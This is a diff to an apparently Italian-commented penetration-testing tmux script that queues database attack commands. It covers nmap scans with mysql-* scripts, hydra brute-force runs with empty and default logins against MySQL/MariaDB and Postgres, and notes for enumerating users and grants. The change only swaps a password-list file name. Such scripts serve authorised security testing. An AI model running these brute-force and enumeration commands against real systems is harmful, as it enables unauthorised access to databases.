@@ -2687,7 +2687,7 @@ tmux split-window -h -t "30.9"
 tmux send-keys -t PT:30.0 "# Mysql/MariaDB: service fingerprint" Enter
 tmux send-keys -t PT:30.0 "nmap -sV -Pn -vv --script=mysql-* $ip -p 3306 -o out.3306"
 tmux send-keys -t PT:30.1 "# Mysql/MariaDB: verify Credentials" Enter
-tmux send-keys -t PT:30.1 "hydra -L users.txt -P passwords.txt -f mysql://$ip:3306 && hydra -L users.txt -P pusers.txt -f mysql://$ip:3306 && hydra -l '' -p '' -f mysql://$ip:3306 && hydra -l 'dontknow' -p '' -f mysql://$ip:3306"
+tmux send-keys -t PT:30.1 "hydra -L users.txt -P passwords.txt -f mysql://$ip:3306 && hydra -L users.txt -P users.txt -f mysql://$ip:3306 && hydra -l '' -p '' -f mysql://$ip:3306 && hydra -l 'dontknow' -p '' -f mysql://$ip:3306"
 tmux send-keys -t PT:30.2 "# Mysql/MariaDB: Access DB" Enter
 tmux send-keys -t PT:30.2 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
 tmux send-keys -t PT:30.3 "printf \"\n# Mysql/MariaDB: Useful information from DB\n# View parameters describing the current state of the server\n mysql> show status;\n# View the user I am connected to the database with\n mysql> select user();\n# I see what rights my user has\n mysql> SHOW GRANTS FOR 'nomeutente'@'localhost';\n\n\" " Enter
@@ -2726,7 +2726,7 @@ tmux split-window -h -t "31.2"
 tmux split-window -v -t PT:31.6
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:31.0 "# Postgres: bruteforce attack" Enter
-tmux send-keys -t PT:31.0 "hydra -L users.txt -P passwords.txt $ip postgres && hydra -L users.txt -P pusers.txt $ip postgres && hydra -l '' -p '' $ip postgres && hydra -l 'dontknow' -p '' $ip postgres"
+tmux send-keys -t PT:31.0 "hydra -L users.txt -P passwords.txt $ip postgres && hydra -L users.txt -P users.txt $ip postgres && hydra -l '' -p '' $ip postgres && hydra -l 'dontknow' -p '' $ip postgres"
 tmux send-keys -t PT:31.1 "# Postgres: Access DB" Enter
 tmux send-keys -t PT:31.1 "psql -h $ip -p 5432 -U USER"
 tmux send-keys -t PT:31.2 "printf \"\n# Postgres: Information Exposure\n# select users and roles\n postgres# SELECT usename, usesysid, usecreatedb, usesuper, userepl FROM pg_user;\n\n\" " Enter
